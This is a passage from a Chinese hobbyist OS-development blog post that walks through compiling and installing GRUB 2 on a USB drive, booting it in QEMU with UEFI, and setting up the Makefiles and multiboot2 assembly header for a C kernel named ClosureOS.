盘进行分区，<strong>请确保你已经将所有重要数据完成备份</strong>，这里笔者选择使用 <code>GParted</code> 进行分区，我们首先通过 <code>Device→Create Partion Table...</code> 建立一个 GPT 分区表：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214927.png"></p><blockquote><p>此时可能会提示无法重建分区表，这是因为 Ubuntu 可能偷偷帮你把分区挂载在 <code>/run/你的用户名</code> ，请使用 <code>umount</code> 卸载所有活动分区，之后重新启动 <code>GParted</code></p></blockquote><p>然后右键新建分区，这里笔者选择建立一个大小为 512MB 的 EFI 分区，注意<strong>该分区必须为 fat32 格式</strong>，剩余的空间作为一个文件系统分区， <em>我们将在后续开发文件系统时用到她</em> ，划分好后点绿色的✅然后 <code>Apply</code>：</p><blockquote><p>这里 GParted 会在 U 盘末尾留下 1MB 的空间，用来放 MBR 分区表，主要是出于兼容目的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127160626.png"></p><p>接下来我们从源码编译 GRUB，首先从 <a href="https://ftp.gnu.org/gnu/grub/">GNU GRUB 的 FTP 服务器</a>进行下载源码，然后在单独的文件夹中进行编译，这里我们三种 GRUB 都编译上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://ftp.gnu.org/gnu/grub/grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">也可以从这里获取： git <span class="hljs-built_in">clone</span> git://git.savannah.gnu.org/grub.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> grub-2.06/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> EFI32 EFI64 BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> EFI64</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=x86_64 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI32</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=pc --disable-nls &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>注：如果你使用的是 Arch&#x2F;Fedora&#x2F;OpenSUSE 这样更新比较快的系统，在编译的时候可能会出错（<del>GCC 背大锅</del>），那么这个时候可能就需要使用更新版本的源码，笔者物理机此前使用的是 Fedora Workstation 38，编译 2.06 时爆了莫名其妙的问题，所以后来笔者选择了 <a href="https://git.savannah.gnu.org/cgit/grub.git/tag/?h=grub-2.12-rc1">2.12 rc1</a> 版本的 GRUB2</p></blockquote><p>然后将 GRUB2 安装到 U 盘的 EFI 分区上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt <span class="hljs-comment"># 注意替换成自己的 U 盘对应的设备节点</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI64/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=x86_64-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../EFI32/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=i386-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../BIOS/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --no-floppy --target=i386-pc --boot-directory=/mnt/boot /dev/sdb</span><br></code></pre></td></tr></table></figure><blockquote><p>这里直接用系统自带的 <code>grub-install</code> 也可以直接安装，但是笔者在 Fedora 系统上使用自带的 <code>grub2-install</code> 时出现了这样一个错误：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">grub2-install: <span class="hljs-keyword">error</span>: this utility cannot be used <span class="hljs-keyword">for</span> EFI platforms because <span class="hljs-keyword">it</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> support UEFI Secure Boot.<br></code></pre></td></tr></table></figure><p>网上也没有找到什么比较好的解决方案，笔者只好从源码进行编译</p><blockquote><p>但是 Ubuntu 自带的 <code>grub-install</code> 就能正常使用，<del>t新系统的苦逼.txt</del></p></blockquote></blockquote><p>接下来我们新建一个文件 <code>/mnt/boot/grub/grub.cfg</code> （假设你的 U 盘 EFI 分区和笔者一样挂载在 <code>/mnt</code> 下），其为 GRUB 的配置文件，编写内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cfg">set timeout=10  # waiting time befo automatic booting<br>set default=0   # default menu entry index<br><br>insmod all_video<br><br>menuentry &quot;Boot ClosureOS v0.0.1&quot; &#123;<br>multiboot2 /boot/kernel.bin # use multiboot2 spec to boot<br>boot<br>&#125;<br><br>if [ $&#123;grub_platform&#125; == &quot;efi&quot; ]; then<br>menuentry &quot;UEFI Setting&quot; &#123;<br>fwsetup<br>&#125;<br>fi<br><br>menuentry &quot;System Reboot&quot; --class=reboot &#123;<br>reboot<br>&#125;<br><br>menuentry &quot;System Shutdown&quot; --class=halt &#123;<br>halt<br>&#125;<br></code></pre></td></tr></table></figure><p>卸载 U 盘，重新启动计算机，进入你的 BIOS&#x2F;UEFI 配置界面，关闭安全启动（<code>Secure Boot</code>），将 U 盘配置为第一个启动项（通常开头会有一个 <code>UEFI: </code> 的标识），重新启动计算机，接下来——</p><p><strong>GNU GRUB，启动！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040634.png"></p><p>当然，现在我们还没有开始编写操作系统内核，所以想要直接启动会报错，不过后面我们编写的内核直接放到 U 盘 EFI 分区的<code>boot/kernel.bin</code> 这个位置就可以直接启动了：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114235156.png"></p><h2 id="创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动"><a href="#创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动" class="headerlink" title="创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动"></a>创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动</h2><p>首先安装一些依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y qemu qemu-system-x86 ovmf xorriso</span><br></code></pre></td></tr></table></figure><p>然后使用如下脚本在 QEMU 中从 U 盘启动 GRUB，注意替换成你自己的 U 盘设备节点路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>sudo qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=/dev/sdb,format=raw,index=0,media=disk<br>-s<br></code></pre></td></tr></table></figure><p>各参数说明如下：</p><ul><li><code>-bios</code> ：指定使用的启动固件，这里是 OVMF，源自于 <a href="https://github.com/tianocore/edk2">EDK2</a> 的 UEFI 固件</li><li><code>-cpu</code>：指定 CPU 类型及特性，<code>kvm64</code> 是一种常规的 CPU 类型，<code>+smep</code> 和 <code>+smap</code> 表示开启阻止内核空间执行&#x2F;访问用户空间数据的保护</li><li><code>-smp</code>：指定 CPU 插槽数、单个插槽上 DIE 的数量、每个 DIE 的核心数、每个核心的线程数</li><li><code>-m</code>：内存大小</li><li><code>--machine</code> ：机器设备类型，QEMU 支持两种设备，另外一种是比较老的 <code>i440fx</code></li><li><code>-drive</code>：添加一个设备，这里添加了 <code>/dev/sdc</code> 设备</li><li><code>-s</code>：支持通过使用 gdb 连接 <code>0.0.0.0:1234</code> 进行调试</li></ul><p>简单测试一下，成功进入 GRUB 界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040935.png"></p><blockquote><p>如果未指定 <code>-bios</code> 参数，则默认会使用 SeaBIOS 进行启动，此时便是传统的 BIOS + MBR 启动方式：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041009.png"></p></blockquote><p>不过可能也有同学手上暂时没有闲置的 U 盘或其他外部存储设备，此时我们也可以使用 <code>grub-mkrescue</code> 创建一个专门用来调试的镜像，首先创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree target/</span><br>target/<br>└── x86_64<br>    └── iso<br>        └── boot<br>            └── grub<br>                └── grub.cfg<br><br>4 directories, 1 file<br></code></pre></td></tr></table></figure><p>接下来使用  <code>grub-mkrescue</code> 创建镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkrescue /usr/lib/grub/x86_64-efi -o kernel.iso target/x86_64/iso</span><br></code></pre></td></tr></table></figure><p>把启动脚本中的设备节点路径改成文件路径即可成功启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=./kernel.iso,format=raw,index=0,media=disk<br></code></pre></td></tr></table></figure><h1 id="0x03-启动一个空白内核"><a href="#0x03-启动一个空白内核" class="headerlink" title="0x03. 启动一个空白内核"></a>0x03. 启动一个空白内核</h1><p>接下来我们终于要正式开始进行内核的编写了，过去绝大部分的操作系统内核都是用 <code>汇编 + C 语言</code> 编写的，不过最近也有使用 Rust 替换 C 语言的内核实现（例如国产操作系统 <a href="https://dragonos.org/">DragonOS</a> ，<strong>与绝大多数 Linux 系统调用兼容，目前已经完成了 musl-gcc 的移植</strong>，笔者觉得非常🐂🍺），Rust 也在逐渐进入 Linux 内核，包括<a href="https://os.educg.net/#/">计算机系统能力大赛</a> 主推的也是 Rust 内核</p><p>但是对于新手而言 Rust 终归是有些难以让人绷得住，在笔者看来<strong>不能像 C 语言那样提供足够贴近于硬件底层的直接抽象</strong>，因此笔者这里还是先选择自己最喜欢的 C 语言来进行内核的编写：）</p><blockquote><p>算下来已经是笔者用 C 写的第四个内核了，希望这次能够达到比较高的一个完成度</p></blockquote><h2 id="代码基本结构"><a href="#代码基本结构" class="headerlink" title="代码基本结构"></a>代码基本结构</h2><p>最初的代码结构如下所示，包含一个空白内核：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── code<br>│   ├── arch<br>│   │   ├── Makefile<br>│   │   └── x86<br>│   │       ├── boot<br>│   │       │   ├── boot_main.c<br>│   │       │   ├── boot.S<br>│   │       │   ├── boot_tty.c<br>│   │       │   └── font.psf<br>│   │       ├── include<br>│   │       │   └── asm<br>│   │       │       ├── cpu_types.h<br>│   │       │       └── page_types.h<br>│   │       └── Makefile<br>│   ├── include<br>│   │   ├── boot<br>│   │   │   └── multiboot2.h<br>│   │   ├── closureos<br>│   │   │   └── types.h<br>│   │   └── graphics<br>│   │       └── font<br>│   │           └── psf.h<br>│   ├── kernel<br>│   │   ├── main.c<br>│   │   └── Makefile<br>│   ├── linker.ld<br>│   └── Makefile<br>├── repack_iso.sh<br>├── run.sh<br>└── target<br>    └── x86_64<br>        └── iso<br>            └── boot<br>                └── grub<br>                    └── grub.cfg<br><br>17 directories, 18 files<br><br></code></pre></td></tr></table></figure><p>我们使用 <code>Make</code> 来进行项目管理，根目录的 <code>Makefile</code> 编写如下，主要作用就是准备统一的编译参数、进入不同文件夹进行 make、链接所有的目标文件：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># Author: arttnba3</span><br><span class="hljs-comment"># 2023.11</span><br><br>CC:= <span class="hljs-variable">$(GCCPREFIX)</span>gcc<br>AS:= <span class="hljs-variable">$(GCCPREFIX)</span>as<br>AR:= <span class="hljs-variable">$(GCCPREFIX)</span>ar<br>LD:= <span class="hljs-variable">$(GCCPREFIX)</span>ld<br>CFLAGS := -pipe -ffreestanding -nostdlib -fno-pie -fno-stack-protector -mcmodel=large<br>LDFLAGS := -nostdlib -z max-page-size=0x1000<br><br><span class="hljs-keyword">export</span> CC<br><span class="hljs-keyword">export</span> AS<br><span class="hljs-keyword">export</span> AR<br><span class="hljs-keyword">export</span> LD<br><span class="hljs-keyword">export</span> CFLAGS<br><br>INCLUDE := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/<span class="hljs-keyword">include</span>/<br>ARCH := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -m)</span><br>OUT := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/out/<br>ARCH_OUT := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/out/arch/<br><br><span class="hljs-keyword">export</span> INCLUDE<br><span class="hljs-keyword">export</span> ARCH<br><span class="hljs-keyword">export</span> OUT<br><span class="hljs-keyword">export</span> ARCH_OUT<br><br><span class="hljs-section">all: prepare kernel.bin</span><br><br><span class="hljs-section">prepare:</span><br>mkdir -p <span class="hljs-variable">$(OUT)</span><br>mkdir -p <span class="hljs-variable">$(ARCH_OUT)</span><br><br><span class="hljs-section">kernel.bin: kernel_file arch_file</span><br><span class="hljs-variable">$(LD)</span> -T linker.ld -o <span class="hljs-variable">$(OUT)</span>/<span class="hljs-variable">$@</span> <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> find <span class="hljs-variable">$(OUT)</span> -name *.o)</span><br><br><span class="hljs-section">kernel_file:</span><br>make -C kernel/<br><br><span class="hljs-section">arch_file:</span><br>make -C arch/<br><br><span class="hljs-section">clean:</span><br>rm -rf ./out<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: all</span><br><br></code></pre></td></tr></table></figure><p><code>include</code> 目录下是用于各个子系统的各种头文件，与 multiboot2 规范相关的一些定义放在 <code>include/boot/multiboot2.h</code> 中，该头文件来自于<a href="https://www.gnu.org/software/grub/manual/multiboot2/html_node/multiboot2_002eh.html">Multiboot 2 spec</a>，比较长，这里就不贴出来了</p><p>内核主体放在 <code>kernel</code> 目录下，其中 <code>kernel/Makefile</code> 编写如下，主要就是编译完放到输出文件夹中：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile">src_files = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.c)</span><br>obj_files = <span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> $(<span class="hljs-built_in">patsubst</span> %c, %o, <span class="hljs-variable">$(src_files)</span>)</span>)<br><br><span class="hljs-section">all:</span><br><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> -c <span class="hljs-variable">$(src_files)</span> -I <span class="hljs-variable">$(INCLUDE)</span><br>mkdir <span class="hljs-variable">$(OUT)</span>/kernel<br>mv <span class="hljs-variable">$(obj_files)</span> -t <span class="hljs-variable">$(OUT)</span>/kernel<br></code></pre></td></tr></table></figure><p><code>kernel/main.c</code> 暂时就先放一个空的函数， <em>本篇博客暂时还用不到这块</em> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>arch</code> 目录下是与架构相关的代码，目前暂时还是只支持 x86，不过后续如果有机会的话笔者希望能够让他在更多架构上跑起来，所以这里设计了一个通用的 <code>arch/Makefile</code>：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">all:</span><br><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(ARCH)</span>,x86_64)<br>make -C x86/<br><span class="hljs-keyword">else</span><br>@echo <span class="hljs-string">&quot;unsupported arch&quot;</span><br>@false<br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p><code>arch/x86/Makefile</code> 主要就是编译汇编和 C 文件以及启动阶段临时用的字体文件放到 <code>out/arch</code> 目录下，这里我们将启动阶段所需的代码都放在 <code>arch/x86/boot</code> 目录下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># Author: arttnba3</span><br><span class="hljs-comment"># 2023.11</span><br><br>boot_dir = boot<br>X86_INCLUDE = <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span>/<span class="hljs-keyword">include</span>/<br><br>src_asm = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.S)</span><br>src_asm += <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> <span class="hljs-variable">$(boot_dir)</span>/*.S)</span><br><br>src_c = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.c)</span><br>src_c += <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> <span class="hljs-variable">$(boot_dir)</span>/*.c)</span><br><br>src_files = <span class="hljs-variable">$(src_asm)</span><br>src_files += <span class="hljs-variable">$(src_c)</span><br><br>obj_files = <span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> $(<span class="hljs-built_in">patsubst</span> %S, %o, <span class="hljs-variable">$(src_asm)</span>)</span>)<br>obj_files += <span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> $(<span class="hljs-built_in">patsubst</span> %c, %o, <span class="hljs-variable">$(src_c)</span>)</span>)<br>obj_files += boot_font.o<br><br><span class="hljs-section">all: <span class="hljs-variable">$(src_files)</span></span><br><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> -c <span class="hljs-variable">$(src_files)</span> -I <span class="hljs-variable">$(INCLUDE)</span> -I <span class="hljs-variable">$(X86_INCLUDE)</span><br>objcopy -O elf64-x86-64 -B i386 -I binary <span class="hljs-variable">$(boot_dir)</span>/font.psf boot_font.o<br>mv <span class="hljs-variable">$(obj_files)</span> -t <span class="hljs-variable">$(ARCH_OUT)</span><br><br></code></pre></td></tr></table></figure><h2 id="boot-S：BIOS-amp-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言"><a href="#boot-S：BIOS-amp-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言" class="headerlink" title="boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言"></a>boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言</h2><p><code>arch/x86/boot.S</code> 中则是我们实际的内核入口点，我们的 multiboot2 header 也可以放在这个地方，这里除了最基本的结构以外笔者还引入了一个指示入口点的 tag，以及一个指示让 GRUB 帮我们设置好指定大小的 frame buffer 的 tag，GRUB2 会根据这个 tag 自动帮我们设置显示模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#define ASM_FILE 1<br>#include &lt;boot/multiboot2.h&gt;<br>#include &lt;asm/cpu_types.h&gt;<br>#include &lt;asm/page_types.h&gt;<br><br>#define GRUB_MULTIBOOT_ARCHITECTURE_I386 (0)<br>#define MULTIBOOT2_HEADER_LEN (multiboot_header_end - multiboot_header)<br>#define MULTIBOOT2_HEADER_CHECKSUM \<br>    -(MULTIBOOT2_HEADER_MAGIC \<br>    + GRUB_MULTIBOOT_ARCHITECTURE_I386 \<br>    + MULTIBOOT2_HEADER_LEN)<br><br>.section .boot.header<br>    .align 8<br><br>    multiboot_header:<br>        .long   MULTIBOOT2_HEADER_MAGIC<br>        .long   GRUB_MULTIBOOT_ARCHITECTURE_I386<br>        .long   MULTIBOOT2_HEADER_LEN<br>        .long   MULTIBOOT2_HEADER_CHECKSUM<br><br>    tag_entry:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_ENTRY_ADDRESS<br>        .short 0<br>        .long 12<br>        .long _start<br>    <br>    tag_frame_buffer:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_FRAMEBUFFER<br>        .short 0<br>        .long 20<br>        .long 1024<br>        .long 768<br>        .long 32<br><br>    tags_end:<br>        .align 8<br>        .short  MULTIBOOT_HEADER_TAG_END<br>        .short  0<br>        .long   8<br>    multiboot_header_end:<br></code></pre></td></tr></table></figure><p>ELF 文件默认的入口点是 <code>_start</code> 函数，因此我们在这里声明一个 <code>_start</code> 函数并导出该符号，从而使得 GRUB 在完成内核的装载之后会从此处开始执行，不过我们也可以通过在 header 中添加一个 <code>entry address tag</code> 来为 GRUB 指定我们的内核入口点：</p><p>不过在正式开始之前，我们首先看看当前的机器状态，这里笔者打算<strong>同时兼容 Legacy BIOS 启动与 UEFI 启动</strong>，因此这两种机器状态我们都得看看如何处理</p><h3 id="①-Legacy-BIOS-启动"><a href="#①-Legacy-BIOS-启动" class="headerlink" title="① Legacy BIOS 启动"></a>① Legacy BIOS 启动</h3><p>当我们使用 Legay BIOS 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址（参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">这里</a>）</li><li><code>cs</code>：权限为 <code>读|执行</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>ds、es、fs、gs、ss</code>：权限为 <code>读|写</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>A20 gate</code>：已开启</li><li><code>cr0</code>：分页（PG）关闭，保护模式（PE）开启</li><li><code>eflags</code>：VM、IF 两个位清空</li></ul><p>剩下的工作都需要我们的内核自行完成，包括段描述符表的设置、堆栈、中断描述符表的设置等</p><h3 id="②-UEFI-启动"><a href="#②-UEFI-启动" class="headerlink" title="② UEFI 启动"></a>② UEFI 启动</h3><p>当我们使用 UEFI 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址</li></ul><p>根据 <a href="https://uefi.org/sites/default/files/resources/UEFI%20Spec%202_6.pdf">UEFI 规范 v2.6</a> 第 2.3.2 节，此时机器有如下状态：</p><ul><li>单处理器模式（Uniprocessor，仅有一个核心被唤醒，参见 <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> 卷 